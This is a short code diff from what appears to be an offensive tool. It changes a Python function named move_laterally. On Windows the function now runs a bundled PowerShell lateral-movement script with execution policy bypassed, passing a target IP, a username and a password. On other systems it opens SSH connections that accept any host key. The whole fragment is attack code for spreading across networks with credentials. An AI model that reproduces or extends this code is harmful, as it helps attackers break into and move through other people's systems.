@@ -13,8 +13,8 @@ import paramiko
 
 def move_laterally(target_ip, username, password):
     if os.name == 'nt':
-        command = f"net use \\\\{target_ip} /user:{username} {password}"
-        os.system(command)
+        script_path = os.path.join(os.path.dirname(__file__), 'windows', 'lateral_movement.ps1')
+        os.system(f"powershell -ExecutionPolicy Bypass -File {script_path} {target_ip} {username} {password}")
     elif os.name == 'posix':
         client = paramiko.SSHClient()
         client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
